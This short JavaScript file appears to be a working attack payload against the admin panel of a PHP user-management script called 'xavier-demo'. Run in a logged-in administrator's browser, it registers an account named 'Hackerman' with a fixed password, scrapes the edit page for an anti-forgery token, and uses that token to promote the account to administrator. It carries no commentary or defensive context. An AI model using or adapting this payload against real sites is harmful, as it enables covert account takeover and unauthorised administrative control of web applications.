var root = ""
var req = new XMLHttpRequest();
var url = root + "/xavier-demo/admin/includes/adminprocess.php"
var params = "user=Hackerman&firstname=Hackerman&lastname=Hackerman&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=Hackerman%40Superman.com&conf_email=Hackerman%40Superman.com&form_submission=admin_registration"
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(params);
var url2 = root + "/xavier-demo/admin/adminuseredit.php?usertoedit=Hackerman";
var regex = /delete-user" value="([^"]*?)"/g;
var req2 = new XMLHttpRequest();
req2.open("GET", url2, false);
req2.send();
var nonce = regex.exec(req2.responseText);
var nonce = nonce[1];
var url3 = root + "/xavier-demo/admin/includes/adminprocess.php";
var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=Hackerman&button=Promotetoadmin"
req2.open("POST", url3, true);
req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req2.send(params2);